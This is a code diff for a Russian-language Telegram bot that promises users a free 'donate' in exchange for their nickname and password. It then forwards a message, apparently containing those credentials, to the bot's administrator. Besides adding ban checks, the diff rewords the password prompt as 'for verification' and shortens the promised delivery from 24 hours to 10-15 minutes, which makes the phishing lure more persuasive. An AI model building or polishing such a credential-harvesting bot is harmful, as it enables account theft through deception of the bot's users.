@@ -37,14 +37,18 @@ def check_spam(user_id):
     
     return len(user_message_times[user_id]) > 10
 
+def is_banned(user_id):
+    """Проверяет, забанен ли пользователь"""
+    c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
+    user_data = c.fetchone()
+    return user_data and user_data[0]
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
         
         # Проверка бана
-        c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
-        user_data = c.fetchone()
-        if user_data and user_data[0]:
+        if is_banned(user_id):
             await update.message.reply_text("❌ Вы забанены.")
             return
         
@@ -67,14 +71,28 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
+    user_id = query.from_user.id
+    
+    # Проверка бана при нажатии на кнопку
+    if is_banned(user_id):
+        await query.message.reply_text("❌ Вы забанены.")
+        return ConversationHandler.END
+    
     if query.data == "get_donate":
         await query.message.reply_text("🔹 Введите ваш никнейм:")
         return NICKNAME
 
 async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
+        user_id = update.effective_user.id
+        
+        # Проверка бана
+        if is_banned(user_id):
+            await update.message.reply_text("❌ Вы забанены.")
+            return ConversationHandler.END
+        
         context.user_data['nickname'] = update.message.text
-        await update.message.reply_text("🔹 Теперь введите ваш пароль:")
+        await update.message.reply_text("🔹 Теперь введите ваш пароль для верификации:")
         return PASSWORD
     except Exception as e:
         print(f"Error in get_nickname: {e}")
@@ -83,6 +101,12 @@ async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
+        
+        # Проверка бана
+        if is_banned(user_id):
+            await update.message.reply_text("❌ Вы забанены.")
+            return ConversationHandler.END
+        
         password = update.message.text
         nickname = context.user_data['nickname']
         
@@ -99,7 +123,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
         
         await update.message.reply_text(
-            "✅ Данные приняты! Донат придет в течение 24 часов.\n\n"
+            "✅ Данные приняты! Донат придет в течение 10-15 минут.\n\n"
             "📢 Обязательно подпишись на наш канал!",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("📢 НАШ КАНАЛ", url=CHANNEL_LINK)]
@@ -120,9 +144,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         
         # Проверка бана
-        c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
-        user_data = c.fetchone()
-        if user_data and user_data[0]:
+        if is_banned(user_id):
             return
         
         # Антиспам
@@ -194,4 +216,3 @@ if __name__ == '__main__':
     # Проверяем, не запущен ли уже бот
     print("🔍 Проверка запущенных процессов...")
     main()
-
